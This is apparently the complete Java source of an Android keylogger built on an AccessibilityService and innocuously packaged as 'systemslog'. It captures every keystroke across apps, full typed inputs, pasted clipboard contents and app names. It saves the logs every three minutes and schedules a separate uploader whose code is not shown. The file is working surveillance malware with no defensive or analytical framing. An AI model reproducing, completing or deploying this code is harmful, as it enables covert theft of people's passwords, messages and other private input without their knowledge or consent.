
        package com.example.systemslog;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.util.Log;
import android.content.ClipboardManager;
import android.content.Context;
import java.text.SimpleDateFormat;
import java.util.*;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private StringBuilder logBuffer = new StringBuilder();
    private StringBuilder fullLineBuffer = new StringBuilder();
    private String lastText = "";
    private String lastPackage = "";
    private Handler handler = new Handler();

    private final long INTERVAL = 3 * 60 * 1000; // Flush logs every 3 mins
    private final long IDLE_DELAY = 2000; // 2 sec idle = full input typed

    private Runnable saveRunnable;
    private Runnable inputIdleRunnable;

    private String lastFullInputText = "";

    @Override
    public void onServiceConnected() {
        LogUploader.scheduleUploader(this); // Schedule periodic uploads

        logBuffer.append("## 📲 New Keylogging Session Started — ").append(getFullTimestamp()).append("\n\n");

        saveRunnable = () -> {
            flushLogs();
            handler.postDelayed(saveRunnable, INTERVAL);
        };

        handler.postDelayed(saveRunnable, INTERVAL);

        Log.d(TAG, "✅ KeyloggerService connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String currentPackage = (event.getPackageName() != null) ? event.getPackageName().toString() : "";

        if (!currentPackage.equals(lastPackage)) {
            String appName = getAppNameFromPackage(currentPackage);
            logBuffer.append("\n---\n**🧩 App:** `").append(appName)
                    .append("`  |  **Package:** `").append(currentPackage).append("`\n---\n");
            lastPackage = currentPackage;
        }

        switch (event.getEventType()) {

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                if (event.getText() != null && !event.getText().isEmpty()) {
                    String currentText = event.getText().get(0).toString();

                    // Delta logic
                    String delta = getDifference(lastText, currentText);
                    if (!delta.isEmpty()) {
                        logBuffer.append("`").append(getTimestamp()).append("` → ").append(delta).append("\n");

                        fullLineBuffer.append(delta
                                .replace("[SPACE]", " ")
                                .replace("[DEL]", "")
                                .replace("[ENTER]", "\n")
                        );
                        lastText = currentText;
                    }

                    // Smart input capture after idle
                    if (inputIdleRunnable != null) handler.removeCallbacks(inputIdleRunnable);

                    inputIdleRunnable = () -> {
                        if (!currentText.equals(lastFullInputText) && currentText.trim().length() > 1) {
                            logBuffer.append("📝 `").append(getTimestamp()).append("` → **[FULL INPUT]**: `")
                                    .append(currentText.trim()).append("`\n");
                            lastFullInputText = currentText;
                        }
                    };
                    handler.postDelayed(inputIdleRunnable, IDLE_DELAY);
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                // Clipboard detection
                CharSequence desc = event.getContentDescription();
                if (desc != null && desc.toString().toLowerCase().contains("paste")) {
                    String clip = getClipboardText();
                    if (!clip.isEmpty()) {
                        logBuffer.append("`").append(getTimestamp()).append("` → 📋 **[PASTE]**: `").append(clip).append("`\n");
                        fullLineBuffer.append(clip).append(" ");
                    }
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                if (event.getText() != null && event.getText().toString().contains("\n")) {
                    logBuffer.append("`").append(getTimestamp()).append("` → ↩️ **[ENTER]**\n");

                    if (fullLineBuffer.length() > 0) {
                        logBuffer.append("📝 **Typed Line:** ").append(fullLineBuffer.toString().trim()).append("\n");
                        fullLineBuffer.setLength(0);
                    }
                }
                break;
        }
    }

    private String getDifference(String oldStr, String newStr) {
        if (newStr.length() > oldStr.length()) {
            String delta = newStr.substring(oldStr.length());
            return delta
                    .replace(" ", "[SPACE]")
                    .replace("\n", "[ENTER]");
        } else if (oldStr.length() > newStr.length()) {
            return "[DEL]";
        }
        return "";
    }

    private String getClipboardText() {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null && clipboard.hasPrimaryClip()) {
            CharSequence text = clipboard.getPrimaryClip().getItemAt(0).getText();
            return text != null ? text.toString() : "";
        }
        return "";
    }

    private String getAppNameFromPackage(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            return pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
        } catch (Exception e) {
            return "Unknown App";
        }
    }

    private void flushLogs() {
        long timestamp = System.currentTimeMillis();
        String data = logBuffer.length() == 0 ? "No logs" : logBuffer.toString();
        FileManager.saveLog(this, data, timestamp);
        logBuffer.setLength(0);
        fullLineBuffer.setLength(0);
    }

    private String getTimestamp() {
        return new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    private String getFullTimestamp() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    @Override
    public void onInterrupt() {}
}
